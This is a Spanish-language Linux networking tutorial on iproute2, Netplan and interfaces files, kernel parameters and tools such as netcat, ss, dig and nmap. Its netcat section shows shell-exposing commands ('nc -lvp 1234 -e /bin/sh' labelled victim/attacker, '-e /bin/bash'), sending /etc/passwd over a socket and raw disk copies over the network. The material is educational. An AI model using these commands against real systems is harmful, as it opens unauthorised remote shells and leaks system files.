# Configuración de red

## Configuración de red de forma no persistente

Hasta la primera década del siglo XXI, los comandos `ifconfig` y `route` se utilizaban para realizar configuraciones de red. El funcionamiento y los nombres de estos comandos se compartían con otros sistemas operativos basados en Unix como **Mac OS X**, **FreeBSD**, **NetBSD**, **Unixware**, **SCO Unix**, etc. En **GNU/Linux** (Debian/Ubuntu), estas utilidades se distribuían dentro del paquete `net-tools`, que se instalaba con la base del sistema operativo. Sin embargo, las herramientas incluidas en el paquete `net-tools` se declararon obsoletas en el año 2011 y, aunque actualmente es posible instalar el paquete para disponer de las herramientas, se recomienda la migración al estándar **iproute2**. La utilización sistemática de los comandos `ifconfig` y `route` para configurar no solo GNU/Linux, sino también otros sistemas operativos basados en Unix, ha hecho que la transición entre ambos paquetes se esté haciendo de una forma progresiva pero muy lenta. De hecho, es posible encontrar por Internet muchos tutoriales de **iproute2** que se basan en exponer traducciones de acciones a realizar con ambas suites.

Todas las utilidades de configuración incluidas en `net-tools` se han incluido en una única herramienta en **iproute2**: el comando `ip`. Las siguientes subsecciones explican las distintas herramientas incluidas en `ip`.

Una cosa muy importante del uso del comando `ip` es que no hay que escribir completamente sus argumentos. Solo es necesario escribir la parte mínima de cada argumento para que sea posible desambiguar. Por ejemplo, el comando `ip address show` se puede resumir en `ip a s`. Adicionalmente, si el último parámetro es `show`, este se puede suprimir, con lo que en el ejemplo anterior se podría simplificar como `ip a`.

### Gestión de parámetros de enlace

La gestión de parámetros de la capa de enlace se hace con el comando `ip` usando como primer parámetro el valor link. Particularmente, esta forma de invocar al comando `ip` va a permitir, entre otras operaciones, consultar todos los parámetros de la capa de enlace de la interfaz, cambiar el estado de la interfaz (up/down), el nombre de la interfaz, el MTU, el tamaño de la cola de envío de tramas o la dirección ethernet. A continuación se muestran varios ejemplos de uso:

| Comando                                        | Definición                                                                                                                                                                                                                  |
| ---------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ip link show`                                 | Permite ver los datos de la interfaz relativos a la capa de enlace.                                                                                                                                                         |
| `ip link set enp0s8 down`                      | Permite desactivar la interfaz mencionada (usar `up` para activarla).                                                                                                                                                       |
| `ip link set enp0s8 name eth2`                 | Renombra la interfaz `enp0s8` a `eth2`. Tras el renombrado, la interfaz cambia de nombre a todos los efectos y se deja de usar el nombre antiguo. Generalmente, no se permite cambiar el nombre si la interfaz está activa. |
| `ip link set enp0s8 address 02:01:02:03:04:08` | Cambia la dirección ethernet (MAC) del dispositivo por la dirección especificada. No se permite cambiar la dirección MAC si la interfaz está activa.                                                                        |
| `ip link set enp0s8 mtu 1200`                  | Cambia el valor de MTU (longitud máxima de trama) del dispositivo al valor especificado. Por defecto en ethernet se usa un MTU de 1500.                                                                                     |
| `ip link set enp0s8 multicast off`             | Desactiva el tráfico multicast para el dispositivo especificado.                                                                                                                                                            |
| `ip link set enp0s8 multicast on`              | Activa el tráfico multicast para el dispositivo especificado.                                                                                                                                                               |
| `ip link set enp0s8 txqueuelen 2000`           | Establece el tamaño de la cola de envío de tramas a 2000 para el dispositivo especificado. Por defecto, el tamaño es 1000.                                                                                                  |
| `ip link set dev enp0s8 promisc on`            | Activa el modo promiscuo, lo que significa que el hardware leerá las tramas incluso si su dirección ethernet de destino no coincide con la dirección ethernet de la interfaz.                                               |

### Gestión de tabla ARP (capa de enlace)

Una parte muy importante del funcionamiento de las redes ethernet es el protocolo ARP (Address Resolution Protocol) que permite obtener direcciones MAC de otros equipos del mismo segmento de red dada su dirección IP. El uso del protocolo ARP para resolver la dirección MAC es necesario justo antes de enviar cualquier tipo de comunicación (aunque sea un simple ping) con un equipo de la red. Para evitar hacer resoluciones ARP para el envío de cada paquete IP o trama ethernet, se emplea una caché con entradas que caducan para almacenar las asociaciones entre direcciones ARP y MAC. Esta caché se conoce con el nombre de tabla ARP.

El protocolo ARP tiene cierta similitud con la identificación por parte de un profesor de un alumno en clase usando su DNI y se podría hacer un símil con esta situación. Los pasos a seguir por el protocolo son los siguientes:

- Dada una dirección IP Y (que se corresponde con un DNI en el símil), se realiza una petición ARP who-has. Una petición ARP who-has es una petición broadcast (que, por tanto, llega a todos los equipos de la red) en la que un equipo X (tell) pregunta quién es el equipo Y (who-has) que tiene una dirección IP concreta. (Ejemplo en tcpdump -n: 17:58:02.636895 arp who-has 10.0.0.254 tell 10.0.0.24). Básicamente esto equivale en el símil usado a que el profesor pregunte en voz alta para toda la clase “¿Quién tiene el DNI Y?”.
- El equipo que tenga la dirección Y responderá con un paquete ARP reply enviado explícitamente al equipo X indicando que es él quien tiene la dirección IP e incluyendo su dirección MAC (17:58:02.637160 arp reply 10.0.0.254 is-at 00:25:90:03:b3:98). Esto equivale a que un alumno levante la mano y le diga al
  profesor soy yo y mi nombre es Manuel. Dado que el equipo Y ha recibido el ARP who-has enviado por X, éste puede determinar en esta petición la dirección IP (porque estaba en la petición ARP who-has) y MAC (porque era la dirección ethernet origen de la trama donde se encapsuló el ARP who-has) de X permitiendo que el ARP reply no sea un broadcast. Además, el equipo Y va a actualizar una tabla ARP que contendrá los resultados de la resolución ARP que se han hecho recientemente (las entradas tienen una caducidad).
- La respuesta ARP reply llegará al equipo X que podrá actualizar su tabla ARP para incluir la información del equipo Y y, posteriormente, establecer la comunicación con él.

La tabla ARP de un equipo se puede manejar con el comando ip y usando _neighbour_ como primer parámetro. Algunos ejemplos de manejo de la tabla ARP son los siguientes:

| Comando                                                              | Definición                                                                                                                                                                                                                           |
| -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `ip neighbour show`                                                  | Muestra la tabla de ARP (tabla de vecinos) del equipo, mostrando las correspondencias entre direcciones IP y direcciones MAC para hosts en el mismo enlace.                                                                          |
| `ip neighbour flush dev enp0s8`                                      | Borra todas las entradas ARP asociadas al interfaz `enp0s8`, eliminando las correspondencias de IP y MAC para ese dispositivo.                                                                                                       |
| `ip neighbour del lladdr 52:54:00:12:35:02 to 10.0.2.2 dev enp0s3`   | Borra la entrada ARP que asocia la dirección MAC `52:54:00:12:35:02` con la dirección IP `10.0.2.2` en el dispositivo `enp0s3`. Es necesario especificar todos los argumentos para identificar de forma única la entrada a eliminar. |
| `ip neighbour add 192.168.1.200 lladdr 02:01:02:03:04:05 dev enp0s8` | Añade manualmente una entrada permanente a la tabla ARP, asignando la dirección IP `192.168.1.200` a la dirección MAC `02:01:02:03:04:05` y asociándola al dispositivo `enp0s8`. Esta entrada no caduca automáticamente.             |

### Gestión de direcciones IP (capa de red)

La gestión de direcciones IP se hace con el comando ip y usando address como primer argumento. Para funcionar correctamente, cada dispositivo (interfaz) debe tener al menos una dirección de red. Se debe tener en cuenta que sobre una misma red física es posible desplegar dos ó más redes IP distintas. A continuación se muestran algunos comandos que ejemplifican el manejo de direcciones IP con iproute2.

| Comando                                                     | Definición                                                                                                                                                                                                                                                                                      |
| ----------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ip address show dev enp0s8`                                | Muestra las direcciones IP configuradas únicamente en el dispositivo `enp0s8`. Si se omite la especificación del dispositivo (`ip address show`), se muestran todas las configuraciones de todos los dispositivos de red.                                                                       |
| `ip address flush dev enp0s8`                               | Elimina todas las direcciones IP configuradas en el dispositivo `enp0s8`                                                                                                                                                                                                                        |
| `ip address add 192.168.200.1/24 dev enp0s8 label enp0s8:1` | Añade la dirección IP `192.168.200.1/24` al dispositivo `enp0s8` usando la etiqueta `enp0s8:1`. El uso de etiquetas es opcional y proviene de la costumbre del antiguo comando `ifconfig`. En `iproute2` se pueden asignar múltiples direcciones IP a una sola interfaz sin necesidad de alias. |
| `ip address del 192.168.200.1/24 dev enp0s8`                | Elimina la dirección IP `192.168.200.1/24` del dispositivo `enp0s8`.                                                                                                                                                                                                                            |

Con estos comandos básicos es posible configurar las direcciones IP y linux añade automáticamente las rutas que se deducen de las propias direcciones IP. Así por ejemplo si se añade la dirección IP 192.168.112.5/24 en el dispositivo enp0s8, se añadirá una ruta que indica que la red 192.168.112.0/24 es alcanzable directamente a través del dispositivo enp0s8.

### Configuración de rutas (capa de red)

La gestión de rutas (estáticas) se hace a través del comando ip con el argumento route. Las rutas permiten seleccionar adecuadamente el interfaz de red por el que el paquete debe enviarse y, de haber una puerta de enlace, a qué equipo debe dirigirse el paquete. Los siguientes ejemplos muestran cómo se hace el manejo de rutas en un equipo Linux.

| Comando                                           | Definición                                                                                                                                                                                                                                               |
| ------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ip route show`                                   | Muestra las entradas de la tabla de enrutamiento, es decir, las rutas que el sistema utiliza para dirigir el tráfico de red hacia diferentes destinos                                                                                                    |
| `ip route add 192.168.119.0/24 dev enp0s8`        | Añade una entrada a la tabla de rutas que indica que la red `192.168.119.0/24` es alcanzable directamente a través del dispositivo `enp0s8`. No se verifica si el dispositivo tiene una dirección en esa red, lo cual es necesario para la comunicación. |
| `ip route del 192.168.119.0/24`                   | Borra la entrada correspondiente a la red `192.168.119.0/24` de la tabla de rutas.                                                                                                                                                                       |
| `ip route add 192.168.119.0/24 via 192.168.1.116` | Añade una ruta para la red `192.168.119.0/24` a través de la puerta de enlace `192.168.1.116`. El sistema calcula automáticamente el dispositivo de salida; si no puede llegar a la puerta de enlace, se genera un error.                                |
| `ip route add default via 192.168.1.116`          | Añade la ruta por defecto (default gateway), que se aplicará cuando ninguna otra ruta coincida con el destino del tráfico.                                                                                                                               |
| `ip route del default`                            | Borra la ruta por defecto de la tabla de enrutamiento.                                                                                                                                                                                                   |

### Fichero `/etc/hosts`

El fichero `/etc/hosts` en Linux es un archivo de texto plano que asocia nombres de host legibles por humanos (como www.ejemplo.com) con direcciones IP específicas. Funciona como un solucionador DNS local: cuando el sistema necesita resolver un nombre de dominio, primero consulta este archivo antes de acudir a los servidores DNS externos. Esto permite realizar asignaciones personalizadas de dominios a IPs, útil para desarrollo, pruebas, bloqueo de sitios o solución de problemas de DNS.

La estructura del archivo es sencilla: cada línea contiene una dirección IP seguida de uno o más nombres de host o alias, separados por espacios o tabuladores. Por ejemplo:

```bash
127.0.0.1       localhost
127.0.1.1       usuario

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# Servidores
192.168.1.10  servidor.local
```

Solo los administradores pueden modificarlo, y los cambios afectan únicamente al equipo local. Es especialmente útil para pruebas antes de actualizar registros DNS reales o para definir rutas internas en redes locales.

## Configuración de red de forma persistente

Para realizar la configuración persistente de la red se puede usar el mecanismo NetworkManager, el gestor de red Netplan (`/etc/netplan/*`) que se introdujo en Ubuntu 20.04 (que se puede usar también con NetworkManager) ó la configuración a través del fichero/s interfaces (`/etc/network/interfaces` ó `/etc/network/interfaces.d/*`) que se emplea especialmente en Debian.
Respecto de NetworkManager, en Debian y Ubuntu Server se provee a través del paquete network-manager frente a los sistemas de escritorio Ubuntu (Ubuntu, Kubuntu, Xubuntu, …) en los cuales NetworkManager es el sistema de configuración por defecto. NetworkManager tiene una interfaz gráfica en la que se puede configurar de forma muy sencilla la red.
Si se cuenta con el sistema NetworkManager en distribuciones anteriores a Ubuntu 20.04, es posible deshabilitar y volver al sistema basado en ficheros (`/etc/network/interfaces` y `/etc/network/interfaces.d/*`) ejecutando como root los comandos que se muestran a continuación.

```bash
systemctl stop NetworkManager.service
systemctl disable NetworkManager.service
```

En los servidores (donde típicamente se usan distribuciones como Debian o Ubuntu Server) no es recomendable usar NetworkManager y se recomienda el uso de la configuración basada en ficheros de texto (fichero/s interfaces ó Netplan). Sin embargo, en el caso de distribuciones de escritorio el uso de NetworkManager está más extendido.

En las últimas versiones de Ubuntu Server ó Desktop (a partir de 20.04) se ha incorporado el uso de Netplan para la configuración de los parámetros de la red a través de los ficheros `/etc/netplan/*` y se ha adaptado NetworkManager para ser compatible con NetPlan.

### Uso de `/etc/network/interfaces.d` (sistema Debian)

Si se ha configurado el sistema para usar fichero/s de interfaz, se puede emplear configuraciones típicas como las mostradas en el ejemplo de abajo. Estas configuraciones se pueden incluir en el fichero `/etc/network/interfaces` y ó en ficheros independientes colocados en el directorio `/etc/network/interfaces.d/`.

```bash
# Configuración usando DHCP del Interfaz enp0s8
auto enp0s8
allow-hotplug enp0s8
iface enp0s8 inet dhcp

# Configuración estática del interfaz enp0s8
auto enp0s8
allow-hotplug enp0s8
iface enp0s8 inet static
    address 192.168.2.7
    netmask 255.255.255.0
    gateway 192.168.2.1
# Sólo se configura gateway si este dispositivo es el que permite interconexión a Internet y otras
# redes. De hecho sólo uno de los dispositivos tendrá configuración gateway y el valor de este parámetro
# se usará para confeccionar la ruta por defecto.

# Configuración usando DHCP tanto con IPV4 como con IPV6 del Interfaz enp0s8
auto enp0s8
allow-hotplug enp0s8
iface enp0s8 inet dhcp
iface enp0s8 inet6 dhcp

# Configuración estática con IPV6
auto enp0s8
allow-hotplug enp0s8
iface enp0s8 inet6 static
    address 2002:1:1:1:0:0:0:2
    netmask 64
    gateway 2002:1:1:1:0:0:0:1
```

Además de configurar las direcciones IP, cuando se emplea la configuración basada en ficheros interfaces resulta necesario cambiar también los servidores DNS a través del fichero `/etc/resolv.conf`. En este fichero habrá que incluir tantas entradas nameserver como servidores de nombres se quieran declarar. Siempre intentará usar primero los declarados y los demás serán considerados como servidores de reserva. A continuación se muestra un ejemplo de uso.

```bash
#Ejemplo de contenido en /etc/resolv.conf
#Se configuran los servidores públicos de nombres de Google para esta instalación
nameserver 8.8.8.8
nameserver 8.8.4.4
```

### Netplan (Ubuntu > 20.04)

Netplan es un gestor de red que se basa en el uso de YAML (YAML Ain't Markup Language), un lenguaje muy extendido en tareas de configuración siendo base de productos como los populares Ansible y docker-compose.
Bajo este sistema, la configuración se realiza a través de los ficheros con extensión .yaml que se encuentran en la carpeta /etc/netplan. Durante la instalación de los sistemas Ubuntu ya se genera una configuración inicial para la distribución (típicamente 00-installer-config.yaml) siendo posible generar todos los ficheros de configuración que se desee.
A continuación se muestra un fichero de ejemplo para configuraciones de ethernets estáticas y dinámicas.

```yml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: true
    enp0s8:
      dhcp4: no
      addresses:
        - 192.168.121.221/24
      gateway4: 192.168.121.1
      nameservers:
        addresses:
          - 8.8.8.8
          - 1.1.1.1
```

Para comprobar que los cambios realizados se han escrito correctamente se puede ejecutar el comando:

```bash
sudo netplan try
```

Para aplicar los cambios realizados en el fichero de netplan basta con ejecutar el siguiente comando.

```bash
sudo netplan apply
```

Al igual que en sistema /etc/network/interfaces, los este mecanismo de configuración es persistente.

Si no se desea emplear NetPlan se puede reactivar el sistema de interfaces (`/etc/network/interfaces.d/*` ó `/etc/network/interfaces`) con los siguientes comandos:

```bash
# Actualiza la lista de paquetes
apt-get update

# Instala el paquete ifupdown
apt-get install ifupdown

# Configura el archivo /etc/network/interfaces
cat <<EOF > /etc/network/interfaces
source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

# Configuración de enp0s3 (DHCP)
allow-hotplug enp0s3
auto enp0s3
iface enp0s3 inet dhcp

# Configuración de enp0s8 (estática)
allow-hotplug enp0s8
auto enp0s8
iface enp0s8 inet static
    address 192.168.2.7
    netmask 255.255.255.0
    gateway 192.168.2.1
    dns-nameservers 8.8.8.8 1.1.1.1
EOF

# Baja las interfaces enp0s3 y lo
ifdown --force enp0s3 lo

# Sube todas las interfaces configuradas
ifup -a

# Habilita y reinicia el servicio de red tradicional
systemctl unmask networking
systemctl enable networking
systemctl restart networking

# Detiene los servicios de systemd-networkd
systemctl stop systemd-networkd.socket systemd-networkd networkd-dispatcher systemd-networkd-wait-online

# Deshabilita los servicios de systemd-networkd
systemctl disable systemd-networkd.socket systemd-networkd networkd-dispatcher systemd-networkd-wait-online

# Enmascara los servicios de systemd-networkd
systemctl mask systemd-networkd.socket systemd-networkd networkd-dispatcher systemd-networkd-wait-online

# Elimina Netplan
apt-get --assume-yes purge nplan netplan.io
```

## Otros parámetros relevantes de la red

En este apartado se analizan otros parámetros relevantes de la red y especialmente lo que tiene que ver con el funcionamiento de Linux como router y el uso de la funcionalidad de firewall para poder hacer NAT (Network Address Translation) y compartir una dirección pública para el acceso a Internet de muchos dispositivos que usan direcciones IP de uso privado (como se hace en los routers que tenemos en nuestras casas gestionando las conexiones a Internet).

### Reenvio IP

Por defecto Linux funciona en modo workstation lo cual quiere decir que, con independencia de lo que se establece en la tabla de rutas IP, si en la capa de red (protocolo IP) se recibe un paquete cuya dirección de destino no encaja con alguna de las configuradas en las distintas interfaces de red, se descarta. Este tipo de paquetes (en el que el equipo es destinatario a nivel de trama ethernet pero no a nivel IP) sólo debería llegar a la capa de red (protocolo IP) en routers. Si lo que se quiere es que el equipo Linux funcione como un router y reenvíe el paquete IP según la información de la tabla de rutas, habrá que activar el reenvío IP.

El reenvío IP es una variable del kernel (por tanto accesible a través de `/proc`), y como es una variable de lectura/escritura se va a colocar en `/proc/sys` (`/proc/sys/net/ipv4/ip_forward`). Aunque es posible modificar y ver estas variables con el comando cat y con echo (cat `/proc/sys/net/ipv4/ip_forward` y echo 1 > `/proc/sys/net/ipv4/ip_forward`), en la actualidad la forma estándar de hacer estos cambios es a través del comando sysctl que permite la consulta/modificación de las variables de `/proc/sys`. En este caso sysctl `net.ipv4.ip_forward=1`.

### Desactivar la respuesta de paquetes ICMP

Es importante saber que el directorio `/proc` permite enviar parámetros en caliente que permiten personalizar el sistema operativo. Un ejemplo típico es modificar el contenido de `/proc/sys/net/ipv4/icmp_echo_ignore_all`, el cual por defecto es 0, al modificar el parámetro por un 1, se deja de permitir la respuesta de paquetes ICMP por lo que ante un ping mi máquina no responde. Gracias a esto estamos modificando los parámetros del kernel del Linux. Estas modificaciones no son persistentes, si se quiere modificar de forma persistente sería necesario en este caso editar el fichero `/etc/sysctl.conf` con:

- net.ipv4.ip_forward = 1
- icmp_echo_ignore_all = 1

### Herramientas de utilidad

#### ping

El comando _ping_ verifica la conectividad con un host mediante paquetes ICMP. Se puede usar en la forma _ping google.com_ o _ping 192.168.100.100_ haciendo uso de la IP del equipo. Tres parámetros deben llamarle la atención:

- -c: Permite especificar el número de ecos que se deben emitir.
- -b: Permite emitir un echo en una dirección de broadcast.
- -I: Permite especificar la interfaz de red.

```bash
ping -c 1 10.9.238.170
ping -b 192.168.1.255
ping -I eth0 192.168.1.60
```

#### Netcat

Netcat es una conocida herramienta para el análisis de red, conocida también como la navaja suiza de los hackers concebida y desarrollada por un hacker (Hobbit) en el año 1996 y posteriormente portada a Windows y a MAC. Tiene cuatro funcionalidades básicas que son:

- Poder abrir un socket de servidor TCP ó UDP en un puerto (ponerse a escuchar en el puerto esperando que alguien se conecte) y establecer una comunicación bidireccional entre este socket con la entrada/salida estándar del sistema ó de un comando (STDIO) cuando se produzca la conexión de algún cliente. Así nc -l -p 8080 creará un socket de servidor que se pondrá a escuchar en el puerto 8080 para recibir conexiones y conectará con la STDIO del sistema. nc -l -p 110 -e /bin/bash permitirá crear un socket de servidor en el puerto 110 y que cuando un cliente se conecte pueda interaccionar con el proceso /bin/bash. nc -l -u -p 53 permite crear un socket de servidor en UDP en el puerto 53.
- Crear un socket de cliente TCP ó UDP por medio del cual se establece una conexión a un servidor remoto y a un puerto y cuando se haya establecido la conexión conectar bidireccionalmente el socket con STDIO ó con el STDIO de un comando. nc www.google.com 80 creará un socket de cliente al servidor www.google.com y al puerto 80.
- Comprobar si un puerto de un servidor remoto está abierto (permite establecer una conexión). Esto se hace empleando las opciones -z y -v (nc -z -v localhost 22).

Estas funcionalidades se han ido completando en las distintas versiones con otras cuestiones secundarias como seleccionar el interfaz de salida, la ruta por la que van a viajar los paquetes, usar IPv6 o permitir especificar el tipo de servicio (TOS).

En Ubuntu se distribuyen dos versiones de netcat. Por defecto se distribuye la versión BSD que no incorpora los parámetros -c/-e para la ejecución de comandos. Para ejecutar comandos con esta versión hay que acudir a las tuberías estándar de Unix y por tanto la comunicación no es completa (o bien la salida del comando se envía por el socket, o bien lo que entre por el socket se envía por salida estándar y lo recibe un comando, pero nunca ambas cosas). Para emplear
los parámetros -c/-e hay que emplear la versión tradicional de netcat que se instala con los siguientes comandos (como root):

```bash
apt-get install netcat-traditional
update-alternatives --config nc #seleccionar nc.traditional
```

La funcionalidad de Netcat es bastante amplia y hace de él una herramienta especialmente interesante para detectar problemas en los protocolos de capa de aplicación. Es especialmente importante tener en cuenta que para crear un socket de servidor en puertos por debajo de 1023 será necesario contar con permisos de root. Algunos ejemplos para ver y comprobar cuestiones de HTTP se muestran abajo.

Servidor: `nc -l -p 2000 -c "(dd if=/dev/sda1 bs=512)"` Cliente `nc 192.168.112.1 2000 -c "(dd of=/dev/sdb1 bs=512)"`  
Servidor: `nc -l -p 80 -c "(/usr/bin/dd if=/dev/sda1 bs=512 | bzip2)"` Cliente: `nc 192.168.112.1 2000 -c "(bzip2 -d | dd of=/dev/sdb1 bs=512)"`  
Servidor: `nc -l -p 2000 < /etc/passwd` Cliente: `nc 192.168.112.1 2000 > passwd`

Otra posibilidad más básica es crear un chat conversacional basado en cliente-servidor y sin ningún tipo de protocolo de capa de aplicación. Hay que tener en cuenta que con netcat, los mensajes se envían justo después de añadir un retorno de carro.

Servidor:

```bash
nc -l -p 2000
Hola
Qué tal?
```

Cliente:

```bash
nc 192.168.112.1 2000
Hola
Qué tal?
```

Por otra parte, existe la posibilidad de generar un shell inverso entre máquina cliente y servidor de la siguiente forma.

Máquina servidor o víctima:

```bash
nc -lvp 1234 -e /bin/sh &
```

Máquina cliente o atancante:

```bash
nc <IP_VICTIMA> 1234
```

La cantidad de múltiples usos de netcat (similares a los que podría tener una navaja suiza), ha derivado en calificar este software de esta forma.

#### Comando ss

El comando _ss_ (socket statistics) es una herramienta moderna que proporciona la misma funcionalidad que netstat, pero es más rápida y ligera. Ofrece:

- Conexiones y sockets de red (más rápido que netstat).
- Filtrado detallado en base a estados, puertos, y protocolos.
- Información similar sobre rutas y estadísticas de red.

Diferencias clave con respecto a netstat:

- Velocidad: ss es significativamente más rápido.
- Obsolescencia: netstat está quedando obsoleto en favor de ss en algunas distribuciones modernas.
- Formato: ss ofrece una sintaxis y salida ligeramente distinta, adaptada a nuevas tecnologías de red.

Ejemplo de comandos:

```bash
ss -tuln: Muestra los puertos TCP/UDP en escucha en modo numérico.
ss -anp: Lista todas las conexiones y sockets con el PID y el nombre del proceso.
ss -putona
```

#### nmcli

_nmcli_ es una herramienta de línea de comandos que forma parte de NetworkManager en Linux, utilizada para gestionar conexiones de red. Con nmcli, puedes realizar una amplia variedad de tareas relacionadas con la configuración de interfaces de red, administración de conexiones Wi-Fi, creación de conexiones VPN, y más, sin necesidad de utilizar una interfaz gráfica, normalmete para realizar scripts. Funcionalidades principales de nmcli:

- Gestionar interfaces de red: Puedes activar, desactivar, y ver el estado de las interfaces de red.
- Configurar conexiones: Permite crear, editar y eliminar conexiones de red (Ethernet, Wi-Fi, VPN, etc.).
- Escanear redes Wi-Fi: Puedes listar y conectarte a redes inalámbricas disponibles.
- Configurar redes con IP estática o dinámica (DHCP).
- Gestionar DNS, puertas de enlace y rutas.

#### hostnamectl

El comando _hostnamectl_ es una herramienta en sistemas Linux que permite gestionar el nombre del host (hostname) y la información relacionada con el sistema. Es parte de systemd y facilita la configuración del hostname, así como la visualización de detalles del sistema, como el sistema operativo, la arquitectura del hardware y más.

```bash
cat /etc/hostname
hostnamectl
hostnamectl set-hostname service.curso.local
systemctl restart systemd-hostnamed
```

#### Configurar el cliente de dns

Para ello es necesario editar el fichero `/etc/resolv.conf`. Podemos en el añadir:

- nameserver 8.8.8.8: Servidor DNS primario.
- nameserver 8.8.4.4: Servidor DNS secundario.
- domain curso.local: Dominio.
- search localdomain curso.local barcelona.curso.local langreo.curso.local: Subdominios.

#### Comando dig

El programa _dig_ es una herramienta de consulta avanzada de servidor de nombres capaz de restituir todos los datos de las zonas de un servidor de DNS.

```bash
dig tele2.es
```

#### Comando host

La herramienta _host_ devuelve el mismo resultado, pero quizá de manera más sencilla.

```bash
host tele2.es
```

#### Comando getent

El comando _getent_ en Linux se utiliza para obtener entradas de las bases de datos del sistema, como usuarios, grupos, hosts, servicios y más. Es una herramienta útil para consultar la información que se gestiona mediante Name Service Switch (NSS), que puede provenir de diferentes fuentes como archivos locales, LDAP, NIS, DNS, etc.

Consultar usuarios (passwd): Muestra una lista de todos los usuarios en el sistema, similar al contenido de `/etc/passwd`:

```bash
getent passwd
getent passwd operador
getent group operadoresldap
getent hosts google.com
```

Bases de datos más comunes que puedes consultar con getent:

- passwd: Muestra la información de los usuarios, como si leyeras /etc/passwd.
- group: Muestra información sobre los grupos, equivalente a /etc/group.
- hosts: Resuelve nombres de host, como si estuvieras consultando /etc/hosts o haciendo una consulta DNS.
- services: Muestra los servicios de red y sus puertos, como los definidos en /etc/services.
- protocols: Muestra los protocolos de red, definido en /etc/protocols.
- networks: Muestra las redes conocidas.
- shadow: Muestra las contraseñas encriptadas de los usuarios (requiere permisos de superusuario).

En resumen, getent es una herramienta muy versátil para consultar diversas bases de datos del sistema. Permite extraer información sobre usuarios, grupos, hosts, servicios, protocolos y más. Es útil en entornos donde se utiliza LDAP o NIS para la gestión de cuentas de usuario y otros recursos de red, ya que consulta todas las fuentes configuradas en /etc/nsswitch.conf.

#### Comando nmap

El comando _nmap_ es un escaneador de puertos:

```bash
yum install nmap -y
apt install nmap -y

nmap --help
nmap localhost

nmap  -v -A 192.168.1.125
```

Como parámetros a destacar:

- _-v_: Activa el modo verboroso (verbose), lo que significa que nmap mostrará más información sobre el progreso del escaneo mientras se ejecuta.
- _-A_: Activa la detección de sistema operativo y versión de servicios, también intenta detectar scripts y realizar un traceroute (ruta de red). Esta opción proporciona un análisis más detallado del host.
